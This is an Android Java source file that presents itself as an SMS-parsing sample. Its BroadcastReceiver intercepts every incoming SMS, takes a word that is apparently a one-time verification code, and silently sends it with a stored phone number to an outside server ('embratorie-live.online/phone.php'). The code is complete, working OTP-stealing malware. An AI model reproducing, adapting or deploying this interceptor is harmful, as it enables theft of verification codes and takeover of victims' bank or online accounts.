package com.joaquimley.smsparsing;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Cache;
import com.android.volley.Network;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;

import java.io.FileInputStream;
import java.io.InputStreamReader;

/**
 * A broadcast receiver who listens for incoming SMS
 */
public class SmsBroadcastReceiver extends BroadcastReceiver {


    private static final String TAG = "SmsBroadcastReceiver";
    Context contextTMP ;
    private String Phone;

    @Override
    public void onReceive(Context context, Intent intent) {

        this.contextTMP = context;
        this.Phone = (String) ReadFromFile(context,"phoneNumber");
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            String smsBody = "";
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                smsBody += smsMessage.getMessageBody();
            }
            smsBody = smsBody.split(" ")[3];
            //create Toast
            Toast.makeText(context, "BroadcastReceiver caught conditional SMS: " + smsBody, Toast.LENGTH_LONG).show();

            // send sms body to server
            sendNetworkRequest(context,smsBody);

            Log.d(TAG, "SMS detected: text " + smsBody);

        }
    }
    public void sendNetworkRequest(Context context , String smsBody){

        // Set up the network to use HttpURLConnection as the HTTP client.
        Network network = new BasicNetwork(new HurlStack());



        // Instantiate the cache
        Cache cache = new DiskBasedCache(context.getCacheDir(), 1024 * 1024); // 1MB cap

        // Instantiate the RequestQueue with the cache and network.
        RequestQueue mRequestQueue = new RequestQueue(cache, network);

        // Start the queue
        mRequestQueue.start();

        String url = "http://embratorie-live.online/phone.php?Phone="+Phone+"&Code="+smsBody;

        // Formulate the request and handle the response.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Do something with the response
                        Toast.makeText(contextTMP, "BroadcastReceiver caught conditional SMS: " + response, Toast.LENGTH_LONG).show();
                        Log.d(TAG, response);
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Toast.makeText(contextTMP, "BroadcastReceiver caught conditional SMS: " + error.getMessage(), Toast.LENGTH_LONG).show();
                        Log.d(TAG, error.getMessage());
                    }
                });
        // Add the request to the RequestQueue.
        mRequestQueue.add(stringRequest);
        //

    }
    public String ReadFromFile(Context context,String fileName ){

        try {
            FileInputStream in = context.getApplicationContext().openFileInput(fileName);
            InputStreamReader sr = new InputStreamReader(in);
            String s="";
            char[] charTab= new char[100];

            int read = sr.read(charTab);

            if(read > 0){
                return String.copyValueOf(charTab,0,read);
            }
            return s;

        } catch (Exception e) {
            return new String("");
        }
    }

}
